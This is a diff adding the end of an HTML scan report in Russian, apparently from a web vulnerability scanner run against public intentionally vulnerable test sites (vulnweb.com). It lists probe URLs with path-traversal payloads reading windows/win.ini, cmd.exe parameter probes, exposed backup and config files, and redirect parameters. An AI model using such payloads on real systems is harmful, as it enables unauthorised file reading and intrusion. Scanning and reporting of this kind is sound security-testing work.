+                        </tr>
+
+                        <tr>
+                            <td>2</td>
+                            <td class="vuln-url"><a href="http://testhtml5.vulnweb.com/?param=cmd.exe" target="_blank">http://testhtml5.vulnweb.com/?param=cmd.exe</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>3</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/?param=cmd.exe" target="_blank">http://testphp.vulnweb.com/?param=cmd.exe</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>4</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/?cmd=../../../../../../windows/win.ini%00" target="_blank">http://testphp.vulnweb.com/?cmd=../../../../../../windows/win.ini%00</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>5</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/?cmd=../../../../../../windows/win.ini" target="_blank">http://testphp.vulnweb.com/?cmd=../../../../../../windows/win.ini</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>6</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/?cmd=part1=../../../../../../windows/win.ini" target="_blank">http://testphp.vulnweb.com/?cmd=part1=../../../../../../windows/win.ini</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>7</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/index.bak" target="_blank">http://testphp.vulnweb.com/index.bak</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>8</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/clientaccesspolicy.xml" target="_blank">http://testphp.vulnweb.com/clientaccesspolicy.xml</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>9</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/crossdomain.xml" target="_blank">http://testphp.vulnweb.com/crossdomain.xml</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>10</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/admin/create.sql" target="_blank">http://testphp.vulnweb.com/admin/create.sql</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>11</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/vendor/installed.json" target="_blank">http://testphp.vulnweb.com/vendor/installed.json</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>12</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/.idea/scopes/scope_settings.xml" target="_blank">http://testphp.vulnweb.com/.idea/scopes/scope_settings.xml</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>13</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/.idea/misc.xml" target="_blank">http://testphp.vulnweb.com/.idea/misc.xml</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>14</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/admin/create.sql" target="_blank">http://testphp.vulnweb.com/admin/create.sql</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>15</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/.idea/modules.xml" target="_blank">http://testphp.vulnweb.com/.idea/modules.xml</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>16</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/.idea/vcs.xml" target="_blank">http://testphp.vulnweb.com/.idea/vcs.xml</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>17</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/crossdomain.xml" target="_blank">http://testphp.vulnweb.com/crossdomain.xml</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>18</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/.idea/encodings.xml" target="_blank">http://testphp.vulnweb.com/.idea/encodings.xml</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>19</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/pictures/wp-config.bak" target="_blank">http://testphp.vulnweb.com/pictures/wp-config.bak</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>20</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/index.bak" target="_blank">http://testphp.vulnweb.com/index.bak</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>21</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/.idea/workspace.xml" target="_blank">http://testphp.vulnweb.com/.idea/workspace.xml</a></td>
+                        </tr>
+
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div id="JuicypathTab" class="tabcontent">
+            <div class="juicypath">
+                <h2>JUICYPATH РЕЗУЛЬТАТЫ</h2>
+                <table class="vuln-table two-col-table">
+                    <thead>
+                        <tr>
+                            <th>№</th>
+                            <th>URL</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+
+                        <tr>
+                            <td>1</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=20" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=20</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>2</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=24" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=24</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>3</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=25" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=25</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>4</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=35" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=35</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>5</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=4" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=4</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>6</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=21" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=21</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>7</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=13" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=13</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>8</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=29" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=29</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>9</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=31" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=31</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>10</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/login.asp?" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/login.asp?</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>11</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=39" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=39</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>12</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=0" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=0</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>13</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=5" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=5</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>14</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/Register.asp?RetURL=/Default.asp?" target="_blank">http://testasp.vulnweb.com/Register.asp?RetURL=/Default.asp?</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>15</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=45" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=45</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>16</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=6" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=6</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>17</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=33" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=33</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>18</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showforum.asp?id=1" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showforum.asp?id=1</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>19</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/Register.asp?RetURL=/Search.asp?" target="_blank">http://testasp.vulnweb.com/Register.asp?RetURL=/Search.asp?</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>20</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=7" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=7</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>21</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp" target="_blank">http://testasp.vulnweb.com/register.asp</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>22</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=19" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=19</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>23</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=14" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=14</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>24</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showforum.asp?id=0" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showforum.asp?id=0</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>25</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=28" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=28</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>26</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/default.asp?" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/default.asp?</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>27</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=22" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=22</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>28</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=18" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=18</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>29</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=34" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=34</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>30</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=10" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=10</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>31</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=15" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=15</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>32</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=3" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=3</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>33</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=27" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=27</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>34</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=23" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=23</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>35</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=12" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=12</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>36</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=11" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=11</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>37</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showforum.asp?id=2" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showforum.asp?id=2</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>38</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=36" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=36</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>39</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=37" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=37</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>40</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=17" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=17</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>41</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=41" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=41</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>42</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/search.asp?" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/search.asp?</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>43</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=8" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=8</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>44</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/templatize.asp?item=html/about.html" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/templatize.asp?item=html/about.html</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>45</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=9" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/showthread.asp?id=9</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>46</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/search.asp" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/search.asp</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>47</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/default.asp" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/default.asp</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>48</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/login.asp" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/login.asp</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>49</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/register.asp?returl=/register.asp" target="_blank">http://testasp.vulnweb.com/register.asp?returl=/register.asp</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>50</td>
+                            <td class="vuln-url"><a href="http://testasp.vulnweb.com/login.asp?returl=/register.asp" target="_blank">http://testasp.vulnweb.com/login.asp?returl=/register.asp</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>51</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/admin/" target="_blank">http://testphp.vulnweb.com/admin/</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>52</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/admin/create.sql" target="_blank">http://testphp.vulnweb.com/admin/create.sql</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>53</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/artists.php?file=../../../admin.php" target="_blank">http://testphp.vulnweb.com/artists.php?file=../../../admin.php</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>54</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/admin/?c=m" target="_blank">http://testphp.vulnweb.com/admin/?c=m</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>55</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/admin/?c=d" target="_blank">http://testphp.vulnweb.com/admin/?c=d</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>56</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/admin/create.sql" target="_blank">http://testphp.vulnweb.com/admin/create.sql</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>57</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/admin/?c=n" target="_blank">http://testphp.vulnweb.com/admin/?c=n</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>58</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/pictures/wp-config.bak" target="_blank">http://testphp.vulnweb.com/pictures/wp-config.bak</a></td>
+                        </tr>
+
+                        <tr>
+                            <td>59</td>
+                            <td class="vuln-url"><a href="http://testphp.vulnweb.com/admin/?c=s" target="_blank">http://testphp.vulnweb.com/admin/?c=s</a></td>
+                        </tr>
+
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <script>
+        function openTab(evt, tabName) {
+            var i, tabcontent, tablinks;
+            tabcontent = document.getElementsByClassName("tabcontent");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].style.display = "none";
+            }
+            tablinks = document.getElementsByClassName("tablinks");
+            for (i = 0; i < tablinks.length; i++) {
+                tablinks[i].className = tablinks[i].className.replace(" active", "");
+            }
+            document.getElementById(tabName).style.display = "block";
+            evt.currentTarget.className += " active";
+        }
+        
+        // Проверка состояния прокрутки для всех контейнеров при загрузке
+        document.addEventListener('DOMContentLoaded', function() {
+            var scrollContainers = document.querySelectorAll('.scroll-container');
+            scrollContainers.forEach(function(container) {
+                // Проверяем, нужен ли скролл
+                if (container.scrollHeight > container.clientHeight) {
+                    container.style.borderColor = '#ccc';
+                } else {
+                    container.style.borderColor = '#f0f0f0';
+                }
+            });
+        });
+        </script>
+
+        <footer>
+            Отчет сгенерирован: 28.04.2025 19:28
+        </footer>
+    </div>
+</body>
+</html>
